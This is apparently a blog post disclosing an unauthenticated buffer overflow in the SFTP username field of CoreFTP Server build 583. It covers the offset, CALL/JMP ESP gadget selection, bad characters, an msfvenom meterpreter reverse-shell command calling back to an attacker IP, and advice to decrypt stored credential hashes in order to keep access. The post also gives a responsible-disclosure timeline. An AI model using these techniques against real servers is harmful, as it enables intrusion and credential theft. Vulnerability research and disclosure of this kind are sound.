---
layout: post
title:  "Unauthenticated Remote Code Execution/DoS on CoreFTP Server - CVE Pending"
date:   2020-08-16 01:01:00 +0100
categories: binary reverse exploitation
---

# Unauthenticated Remote Code Execution/DoS on CoreFTP Server - CVE Pending

Well hello there, hope everyone is doing well on this lockdown. As with many people, I start learning some new tricks and I went very old school on this one. Due to the excess time, we had to play with another thing I started looking again for old school exploits such as Buffer Overflows. Well, it didn't take long to find one.

CoreFTP comes in two versions: a client and a Server. Let us focus on the server-side. CoreFTP Server is a FTP Server (shocking) that allows IT administrators not only to serve as FTP but as SFTP with client certificates and integrate with the domain. For the sake of clarity, we tested the Core FTP build 583.

## Starting testing

As with every test we start by sending some erroneous data to every user input field possible. There were a lot of crashes in the Server Management GUI. For instance, on the self-signed server certificate fields, we could overwrite the EIP pretty easily, but the problem would be non-ASCII characters and it would be dumb since you there already have access to the management interface that supposedly operates in Administrative mode since the server needs to bind to lower ports (0-1023).


However, this just opens a door to exploit other fields. The server exposes a network port to allow clients to connect and retrieve data. I choose to go with the SFTP (Basically SSH only with file support) with SSH keys enabled. The first idea was to try to send garbage data in the Key-Exchange phase of the protocol, for instance, send an overly long encoded communication to trigger the exploit. However, the clients try to verify if the data is valid before sending. Next, I just tried the simple username with ```'A'*huge_amount``` and the server stopped responding and hanged. Hmmm..

![crashServer]({{images/coreftprce/image4.png | absolute_url}})


I quickly created an environment with the service running on a Windows XP SP3 Build 2600 (because, no protections) and another on a Windows 10 machine. For the sake of clarity, my **victim machine will be at 192.168.155.132** and the **attackers machine will be at 192.168.155.176**. I quickly checked the binary and verified that it doesn't have any security extensions this means no ASLR no DEP, nothing. This means that we don't need to worry about bypassing these technologies. I follow the training in [here](https://www.fuzzysecurity.com/tutorials.html) (and I really recommend it). I attached a debugger (ImmunityDBG) to the process and generated a SSH key pair (it really doesn't matter as we are going to find out) and use it to connect to the server but with the 'A'*1024 as the username and we get the glorious EIP 41414141. Hurray! We control the EIP and have a basic entry point to try to exploit this!

![debuggerattached]({{images/coreftprce/image5.png | absolute_url}})


## Exploiting it

If you read the tutorial link (and I think you should if it's the first time you reading something like this) you should know that the next step is to determine the offset to rewrite the EIP. You can either do it by trial and error or be intelligent and use something like the pattern generator tool from the Metasploit framework. Using that we can see that the EIP will be overwritten after ```198 bytes```. This means that we need to write 198 bytes before rewriting it.

![monafindoffset]({{images/coreftprce/image1.png | absolute_url}})

After that find any instruction capable of jumping to our shellcode such as a ```call ESP```. We can use [mona script](https://github.com/corelan/mona) to help enumerate all the possibilities to do this. Basically, it will search for all compatible instructions in all the code and imported functions. Since the main code contains a NULL byte we can not choose it so we need to rely on imported DLLs. Since Windows XP have a lot of them without ALSR we can pick one that suits us. This means that the exploit needs to be ported for other operating systems, service packs, maybe languages... etc.

![monajumptoshellcode]({{images/coreftprce/image6.png | absolute_url}})

In the previous image, we can see some of the possible ```JUMP ESP``` instructions but there are a lot more on them in a text file on your workspace:

![monajumptoshellcode2]({{images/coreftprce/image7.png | absolute_url}})

Next, we should move along and perform a bad chars evaluation. This means, when we send the characters to the buffer, some of them may break the normal functioning of the exploit (due to verifications or operations on them). To do this we can use the mona script to generate an array of all possible values, from 0x00 to 0xFF or 0 to 255. Sending this buffer and analyzing the memory afterwards gets us the bad chars. Mona script can help compare the chars and the bad chars and provide a direct response on what we should exclude of the payload.

![monadetectbadchars]({{images/coreftprce/image8.png | absolute_url}})


The payload can then be crafted using the Metasploit Venom and passing the bad chars (```\x00 \x01 \x02 \x0a \x0d \x40```) with the '-b' flag. We generate a small payload to get remote code execution:

```msfvenom -a x86 --platform Windows -p windows/meterpreter/revrse_tcp LHOST=192.168.155.176 LPORT=443 -b '\x00\x01\x02\x0a\x0d\x40 -f python --smallest```

 In this case, I used a meterpreter payload just because but you can choose whatever you want. I just opened a listener on Metasploit console and run the following exploit.

![exploitcode]({{images/coreftprce/image9.png | absolute_url}})


Yes, I pasted an image with the code because it could trigger Antivirus Agents since it has a very rudimentary Meterpreter shell in it. The exploit uses the [paramiko SSH library](http://www.paramiko.org/) to connect to the SSH service and pass the payload as the username. Obviously, the connection will fail but at that point, we should get our shell in Metasploit. One small detail, if we use the ```CALL ESP``` the exploit will succeed and the service will continue to run as intended, at least on this case. Hurray, we got unauthenticated RCE! =). Some additional remarks are in order: Once you get RCE and can access the file system, try to access the configuration file. There you will find several hashes encrypted with AES256, some dude did a great reversing job and posted the procedure to decrypt them [here](https://coreysalzano.com/how-to/how-to-extract-passwords-from-core-ftp-le/). You can also look for certain memory locations of the decrypted hashes (I sure did but later found out this, at least I learn something in the process). Then you can use that credential hopefully to maintain access. The application needs to run on Administrator mode so you just got at least Local Administrative on a machine, congratz!

![exploitcode]({{images/coreftprce/image10.png | absolute_url}})

There are also other versions vulnerable to this but after version 2.1 of the CoreFTP Server, the buffer started converting to UTF-8 and we need to perform [Venetian method](https://img2.helpnetsecurity.com/dl/articles/unicodebo.pdf) to exploit it. I was not successful in doing that so the last that we are able to achieve is Denial of Service (DoS). To do this we just send garbage to the buffer and crash the service. Meh, not that good but could be helpful in some situations. Maybe someone that knows more than what I do can help and exploit this.

There is the problem of portability of the exploit. I did this on a Windows XP SP3 machine (except the detection of security extensions, that I did on the Windows 10 Machine) so I won't be bothered with ASLR and DEP modes. Since the code of the program holds bad chars, such as the NULL byte (0x00) we can't use it to steal an instruction to jump to our shellcode, otherwise, the exploit would work on all OSs. Therefore we needed to use some of the imported DLLs present to reuse the instruction and to jump to our shellcode. One interesting thing to work on is to try to craft something that would bypass the authentication, jump the verification of the password and give access to files. Don't know if it is possible but I wonder. Also, this exploit **only works if the SSH key is enabled**. You don't need a user registered with it but the server should accept it. Basically, the problem relies on the strongest configuration (using SSH keys to authenticate users) even if there is none configured.

## Disclosure

This vulnerability follows the responsible disclosure standard. At first, the vendor did not reply but after insisting I got trough to someone who could patch this. After investigation, he provided the patch to clients and after the patch is available for one month, I released this disclosure. I like to thank them for providing support for fixing this vulnerability. As a footnote, I am still wating for the CVE ID from Mitre, when that's available, I'll update this page.

## Timeline

* 01/05/2020 - Vulnerability discovery
* 02/06/2020 - First contact with vendor
* 21/06/2020 - Second contact with vendor
* 26/06/2020 - Vulnerability fix tested, patch confirmed
* 27/07/2020 - Official date of release
* 16/08/2020 - Real date of release
